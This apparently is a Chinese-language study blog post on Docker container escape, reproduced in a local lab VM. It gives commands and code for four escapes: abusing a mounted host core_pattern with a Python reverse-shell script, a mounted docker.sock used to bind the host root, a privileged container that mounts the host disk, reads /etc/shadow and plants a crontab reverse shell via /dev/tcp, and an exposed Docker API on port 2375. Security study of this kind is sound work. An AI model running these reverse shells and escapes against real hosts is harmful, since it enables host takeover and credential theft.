---
title: Docker逃逸学习
date: 2026-05-28T20:27:36+08:00
lastmod: 2026-05-28T20:27:36+08:00
summary:
url: /posts/Docker逃逸学习/
categories:
  - 云安全
tags:
  - Docker逃逸
draft: false
---
# 前言

趁着这几天刚出完公司的题，抽出时间看了一下docker逃逸方面的东西，这里的话主要就是放攻击手法了，一些基础的概念就懒得赘述了

# 如何判断虚拟环境类型

参考：https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/

通常在getshell之后，我们都需要考虑一个问题：我们是真的拿到目标机器的shell了还是只是处于机器中虚拟环境里？前者的话肯定直接做一些比如提权，内网穿透，横向移动，权限维持等内网渗透的手法，但是如果我们此时是处在机器中的虚拟环境中的话，我们需要先判断该虚拟环境的类型

通常情况下，shell的虚拟环境可能有三个类型：虚拟机，Docker，k8s。这三种类型对应着三种不同的攻击面：

- **虚拟机**：通常考虑横向移动来扩大攻击效果

- **Docker**：通常考虑容器逃逸到宿主机

- **K8s**：通常先尝试接管集群，以获取对容器和集群资源的完全控制（注意：K8s其实本质上也是跑容器，只不过不一定用 Docker，现代 K8s 常见运行时是 containerd / cri-o）

当然，仍有一些特殊的情况比如：Docker运行在虚拟机里，这种情况在这里就不讲述了

## 查看主机名和进程

```bash
hostname	#查看主机名

ps aux		#显示系统上所有用户的详细进程信息
```

Docker 默认 hostname 通常是容器 ID 的前 12 位（不绝对），PID1非系统进程，可初步判断当前为容器环境

如果是在普通虚拟机或物理机里，PID 1 通常是：systemd 或者 init

如果是在容器里，PID 1 可能是：

bash，sh，python，node，java，nginx，tini，supervisord

![](image/Pasted%20image%2020260604204425.png)

但是注意：

- 有些容器也会跑 systemd
- 有些轻量 VM 也可能不是 systemd

所以 PID 1 只是作为初步的判断

## 检查根目录下.dockerenv文件

```bash
ls -la /.dockerenv
```

通过判断根目录下的`.dockerenv`文件是否存在，确认当前环境是否为容器环境。

需要注意：有些 Docker 容器可能没有这个文件，甚至有些镜像为了伪装会删除掉这个文件

## 看 cgroup 信息

```bash
cat /proc/1/cgroup
  或者：
cat /proc/self/cgroup
```

这个文件是一个 **内核提供的虚拟文件，里面包含了PID 1 这个进程属于哪些 cgroup**，而cgroup 是 Linux 用来做**资源隔离和限制**的机制，通常用于限制一个进程/容器的cpu，内存等资源使用

Linux内核目前存在两个主要的Cgroup版本，v1和v2

![](image/Pasted%20image%2020260604205544.png)

如果是Docker容器的话则会显示`/docker/<container_id>`，不过这个方法仅仅使用于v1，在 Cgroup v2 下Docker 默认启用Cgroup 命名空间，也就是 **private cgroup namespace**，所以此时 /proc/1/cgroup 显示的是**容器自己的 cgroup 命名空间视角**，不是宿主机上的真实路径。

![](image/Pasted%20image%2020260604210005.png)

# Docker逃逸手法

## Docker 安装

复现的话还是建议在虚拟机里面启动容器，每次测试之前打个快照，这样能保险一点

放一下agent给出的命令

```bash
sudo apt update
sudo apt install -y ca-certificates curl gnupg lsb-release

安装 Docker 官方源：

sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
    sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

sudo chmod a+r /etc/apt/keyrings/docker.gpg

添加源：

echo \
    "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
    https://download.docker.com/linux/ubuntu \
    $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
    sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

安装：
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

验证：
sudo docker version
sudo docker run hello-world
```
## 挂载宿主机procfs逃逸

procfs（/proc）是Linux 内核提供的伪文件系统，它里面很多文件不是磁盘上的真实文件，而是内核状态或内核配置的接口。

其中/proc/sys/kernel/core_pattern 文件是 Linux 内核的一个 sysctl 参数，用来控制 **程序崩溃时 core dump（崩溃转储文件） 怎么生成**。

core dump 是什么？当进程因为异常信号崩溃时，Linux 可以把这个进程当时的内存、寄存器状态等保存下来，生成一个 core 文件，方便调试。而具体怎么生成这个core文件则由core_pattern来决定

### 漏洞利用条件

1. **宿主机procfs被错误的挂载在容器中**
2. 从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。**如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行**
3. 容器**未开启User Namespace**时，容器中的root用户与宿主机的root用户UID会一致，则可能导致挂载在容器中的procfs下文件可写

也就是说，如果宿主机 procfs 被挂进容器，并且容器 root 没有被 User Namespace 映射隔离，那么容器就能修改宿主机的 core_pattern，再通过制造崩溃让宿主机内核执行攻击者指定的程序，从而实现逃逸。

### 如何判断是否可利用

先判断是否存在错误挂载

```bash
cat /proc/self/mountinfo | grep ' proc '
cat /proc/mounts | grep ' proc '
findmnt -t proc

find / -name core_pattern 2>/dev/null | wc -l | grep -q 2 && echo "Procfs is mounted." || echo "Procfs is not mounted."
如果返回 Procfs is mounted. 说明当前挂载了 procfs

```

因为/proc/self/mountinfo是内核实时生成的当前进程挂载表。当然也可以直接find看看当前容器是否有两个core_pattern：`find / -name core_pattern`

然后看看是否开启了User Namespace

```bash
cat /proc/self/uid_map
cat /proc/self/gid_map
```
### 环境搭建&利用

搭建环境：

```bash
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
```

判断是否存在错误挂载

![](image/Pasted%20image%2020260531131422.png)

 第一个红框可以发现存在错误挂载proc的core_pattern，且rw表示可写，第二个红框是判断是否开启了User Namespace，这里是未开启的状态，容器root的uid和宿主机的uid相同

漏洞利用：

先找到当前容器在宿主机下的绝对路径：

```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
cat /proc/self/mountinfo | grep ' / / '

root@d70a01c5bb81:/# cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
workdir=/var/lib/docker/overlay2/e6ad0aecaee1c10c3ad0d2c35bc518790d58c4c3793a879ec7fa7590b5323c82/work
```

可以看到绝对路径是/var/lib/docker/overlay2/e6ad0aecaee1c10c3ad0d2c35bc518790d58c4c3793a879ec7fa7590b5323c82/work

- **当前容器新建/修改的文件** 在宿主机上的真实路径通常是：
    
    `/var/lib/docker/overlay2/[xxx]/diff`
    
- **宿主机看到的容器完整根文件系统视图** 在宿主机上通常是：
    
    `/var/lib/docker/overlay2/[xxx]/merged`
    

所以如果你在容器里写了：

`echo test > /tmp/x`

那么宿主机上大概率对应：

`/var/lib/docker/overlay2/abcd1234/diff/tmp/x`

而容器根 / 对应的宿主机合并路径一般是：

`/var/lib/docker/overlay2/abcd1234/merged/tmp/x`

但是一些没有在容器中新增或修改的文件，则无法通过diff去访问

然后写一个反弹shell的python脚本（当前测试环境没有vim和gcc需要额外下载）：

```python
#!/usr/bin/python3

import  os
import pty
import socket

lhost = "xx.xx.xx.xx"
lport = 7777

def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   # os.remove('/tmp/.shell.py')
   s.close()

if __name__ == "__main__":
   main()
```

然后赋予执行权限

```bash
chmod 777 shell.py
```

接着我们尝试构造` |program `语法写入core_pattern

```bash
echo -e "|/var/lib/docker/overlay2/e6ad0aecaee1c10c3ad0d2c35bc518790d58c4c3793a879ec7fa7590b5323c82/merged/tmp/shell.py \rcore    " >  /host/proc/sys/kernel/core_pattern
```

为什么是这个路径呢？因为我们最终的目的是需要让容器崩溃使得宿主机会通过core_pattern去处理程序崩溃，从而执行` |program`语法

当然换成实际宿主机保存路径diff也是可以的

然后我们写一个能让容器崩溃的脚本

```c
#include<stdio.h>

int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
```

gcc编译&执行程序

```bash
gcc .crash.c -o .crash
./crash
```

记得在攻击机上监听端口再执行程序

成功监听到宿主机的反弹shell

![](image/Pasted%20image%2020260531133905.png)

成功逃逸！

## 挂载docker socket逃逸

Docker Socket (/var/run/docker.sock) 是 Docker 守护进程（dockerd） 与 客户端（如 docker CLI、Docker API 调用） 之间的主要通信接口，即用来与守护进程通信即查询信息或者下发命令

![](image/Pasted%20image%2020260531135131.png)

所以若容器挂载了`/var/run/docker.sock`，就相当于获得了 Docker CLI（命令行接口）的完全访问权限，通过 Docker API，可以在容器内部直接管理宿主机上的 Docker 进程，最终导致容器逃逸

### 如何判断是否可利用

```bash
ls /var/run/ | grep -qi docker.sock && echo "Docker Socket is mounted." || echo "Docker Socket is not mounted."
如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket

cat /proc/self/mountinfo | grep -E 'docker\.sock|containerd\.sock|crio\.sock|podman\.sock'

cat /proc/mounts | grep -E 'docker\.sock|containerd\.sock|crio\.sock|podman\.sock'

findmnt | grep -E 'docker\.sock|containerd\.sock|crio\.sock|podman\.sock'

```

### 环境搭建&利用

环境搭建

```bash
docker run -it --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
```

进入容器后需要安装Docker客户端，这样才能使用docker socket

```bash
apt-get update
apt-get install curl


apt-get install -y docker.io

# 验证
docker version
```

漏洞利用：

```bash
docker run -it -v /:/host ubuntu /bin/bash
```

创建并启动一个新容器，把宿主机根目录挂载到新容器的/host目录下

![](image/Pasted%20image%2020260531161301.png)

不然的话就是用curl去发送请求API接口

### curl请求docker.sock

 - 基础检查

| 功能             | 方法  | 命令                                                                  | 说明              |
| -------------- | --- | ------------------------------------------------------------------- | --------------- |
| 测试 socket 是否可用 | GET | curl -i --unix-socket /var/run/docker.sock http://localhost/_ping   | 正常返回 OK         |
| 查看 Docker 版本   | GET | curl -s --unix-socket /var/run/docker.sock http://localhost/version | 返回版本 JSON       |
| 查看 daemon 信息   | GET | curl -s --unix-socket /var/run/docker.sock http://localhost/info    | 返回宿主机 Docker 信息 |
- 枚举信息

| 功能       | 方法  | 命令                                                                                         | 说明                |
| -------- | --- | ------------------------------------------------------------------------------------------ | ----------------- |
| 列出运行中的容器 | GET | curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json                | 默认只显示运行中的容器       |
| 列出所有容器   | GET | curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/json?all=1"        | 包括已停止容器           |
| 查看容器详情   | GET | curl -s --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/json | 类似 docker inspect |
| 列出镜像     | GET | curl -s --unix-socket /var/run/docker.sock http://localhost/images/json                    | 查看本地镜像            |
| 列出卷      | GET | curl -s --unix-socket /var/run/docker.sock http://localhost/volumes                        | 查看 Docker volumes |
| 列出网络     | GET | curl -s --unix-socket /var/run/docker.sock http://localhost/networks                       | 查看 Docker 网络      |
- 控制已有容器

|功能|方法|命令|说明|
|---|---|---|---|
|启动容器|POST|curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/start|启动已有容器|
|停止容器|POST|curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/stop|停止容器|
|重启容器|POST|curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/restart|重启容器|
|删除容器|DELETE|curl -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/<container_id>?force=1"|强制删除容器|
- 创建与运行容器

| 功能     | 方法   | 命令                                                                                                                                                                                   | 说明          |
| ------ | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------- |
| 创建普通容器 | POST | curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sh","-c","id; sleep 3600"]}' http://localhost/containers/create | 返回新容器 Id    |
| 启动新容器  | POST | curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<new_id>/start                                                                                           | 启动新创建的容器    |
| 查看容器日志 | GET  | curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<new_id>/logs?stdout=1&stderr=1"                                                                             | 查看标准输出和错误输出 |
- 在容器内执行命令（exec）

| 功能      | 方法   | 命令                                                                                                                                                                                                                             | 说明         |
| ------- | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------- |
| 创建 exec | POST | curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":false,"Cmd":["sh","-c","id; ls /"]}' http://localhost/containers/<container_id>/exec | 返回 exec_id |
| 启动 exec | POST | curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Detach":false,"Tty":false}' http://localhost/exec/<exec_id>/start                                                                 | 执行并返回输出    |
- 创建挂载宿主机目录的容器

| 功能            | 方法   | 命令                                                                                                                                                                                                                                                                          | 说明                   |
| ------------- | ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- |
| 创建挂载宿主机根目录的容器 | POST | curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sh","-c","sleep 3600"],"HostConfig":{"Binds":["/:/host"]}}' http://localhost/containers/create                                                         | 将宿主机 / 挂到容器内 /host   |
| 创建高权限容器       | POST | curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sh","-c","sleep 3600"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/host"]}}' http://localhost/containers/create | 高权限 + host namespace |
创建容器

```bash
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "ubuntu",
    "Cmd": ["/bin/bash"],
    "Tty": true,
    "OpenStdin": true,
    "AttachStdin": true,
    "AttachStdout": true,
    "AttachStderr": true,
    "StdinOnce": true,
    "HostConfig": {
      "Binds": ["/:/host"]
    }
  }' \
  "http://localhost/containers/create?name=hostbash"
```

启动容器

```bash
curl -X POST --unix-socket /var/run/docker.sock "http://localhost/containers/hostbash/start"
```

附着到容器

```bash
curl -sN -X POST --unix-socket /var/run/docker.sock \
  -H "Connection: Upgrade" \
  -H "Upgrade: tcp" \
  "http://localhost/containers/hostbash/attach?stream=1&stdin=1&stdout=1&stderr=1"
```

## privileged特权模式逃逸

当Docker容器以`--privileged`特权模式启动时，宿主机内核会向容器授予接近宿主机root进程的能力，具体有以下权限：

- **完全设备访问权限**：可访问 `/dev` 下所有宿主机设备（如 `/dev/sda`或`vda`、`/dev/tty` 等）。
- **完整 Linux Capabilities**：默认容器只有约 14 个 capabilities（如 `NET_BIND_SERVICE`、`CHOWN` 等），`--privileged` 会授予**全部 40+ 个** capabilities，包括：
 1. `SYS_ADMIN` — 挂载文件系统、修改内核参数
 2. `SYS_PTRACE` — 调试/注入任意进程
 3. `SYS_MODULE` — 加载/卸载内核模块
 4. `NET_ADMIN` — 修改网络接口、路由表、iptables
- Seccomp / AppArmor 等**安全隔离机制**全部关闭

在如此高的权限下就容易存在容器逃逸的危险

### 判断容器是否为特权模式

```bash
cat /proc/self/status | grep CapEff
```

在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff
### 环境搭建&利用

首先我们创建一个普通用户并加入Docker组：

```bash
root@wanth3f1ag-virtual-machine:~# useradd -m -s /bin/bash wanth3f1ag_docker
root@wanth3f1ag-virtual-machine:~# passwd wanth3f1ag_docker1
passwd: user 'wanth3f1ag_docker1' does not exist
root@wanth3f1ag-virtual-machine:~# passwd wanth3f1ag_docker
New password:
Retype new password:
passwd: password updated successfully
root@wanth3f1ag-virtual-machine:~# usermod -aG docker wanth3f1ag_docker
root@wanth3f1ag-virtual-machine:~# su - wanth3f1ag_docker
wanth3f1ag_docker@wanth3f1ag-virtual-machine:~$
```

![](image/Pasted%20image%2020260610130822.png)

在普通用户下使用`--privileged=true`创建一个容器

```sh
docker run --rm --privileged=true -it alpine
```

启动一个临时的、有完整宿主机权限的 Alpine 交互式 shell，`--rm`参数表示容器退出后**自动删除**

至此环境搭建完毕

然后就是复现

判断是否为特权模式

![](image/Pasted%20image%2020260610130835.png)

查看挂载磁盘设备

```bash
fdisk -l
```

![](image/Pasted%20image%2020260610130853.png)

发现有一个64GB的/dev/sda的磁盘，里面分别有三个分区，sda3为主数据分区，宿主机文件大概率都在这里，将其挂载到容器目录

```bash
mkdir /test && mount /dev/sda3 /test
```

![](image/Pasted%20image%2020260610130905.png)

成功挂载到容器，尝试读取宿主机文件

```bash
cat /test/etc/passwd
cat /test/etc/shadow
```

![](image/Pasted%20image%2020260610130913.png)

接下来尝试写定时任务反弹shell

```bash
echo '* * * * * root /bin/bash -c "sh -i >& /dev/tcp/ip/port 0>&1"' >> /test/etc/crontab
```

![](image/Pasted%20image%2020260610130922.png)

并且还是root权限

逃逸的方法其实不止一个，如果宿主机是暴露在公网的话，我们甚至可以添加新用户并直接ssh连接上去

![](image/Pasted%20image%2020260610131357.png)

## docker远程API未授权访问逃逸

先理解一下Docker的两种通信方式

### Docker的通信方式

Docker 的 client-server 架构中，客户端和 daemon 之间通过 **API** 通信，这个 API 有两种监听方式：

- Unix Socket（默认启动）
client → /var/run/docker.sock → dockerd 仅本机进程可访问，不走网络
- TCP Socket（需手动开启）
client → 网络 → TCP 端口 → dockerd 任何能访问该端口的机器都可以发请求

第一种的话之前也讲过，存在错误挂载的话可以导致Docker逃逸，第二种的话就涉及到API未授权访问了

### 漏洞原理

Docker remote api可以远程执行docker命令，如果用户错误配置将api暴露在公网，攻击者可以通过远程调用docker API直接管理和创建容器，进而导致逃逸进行getshell

### 如何判断是否可利用

Docker remote api默认服务端口是2375

**2375 是 Docker daemon 未加密 TCP 监听的约定端口**（2376 是 TLS 加密版本）。

```bash
curl http://目标IP:2375/ #页面返回message则表示存在未授权访问
curl http://目标IP:2375/version # 直接返回 Docker 版本信息 
curl http://目标IP:2375/containers/json # 列出所有容器
```

### 环境搭建&利用

首先搭建环境，将docker守护进程监听在0.0.0.0

```bash
dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
```

如果云服务器有防火墙记要开放2375端口

随后访问2375端口就可以看到Docker remote api了
# 总结

docker逃逸主要是由于错误配置，API暴露以及错误挂载宿主机资源，以上的几种也并非是Docker逃逸的全部，只是通过这几种常见的逃逸手法对docker云安全有了一个浅浅的认识。

docker逃逸检测项目地址：https://github.com/teamssix/container-escape-check

参考文章：

https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/

https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/#docker%E7%94%A8%E6%88%B7%E7%BB%84%E6%8F%90%E6%9D%83

https://www.cnblogs.com/CVE-Lemon/p/18674800

https://www.isisy.com/1510.html

https://github.com/teamssix/container-escape-check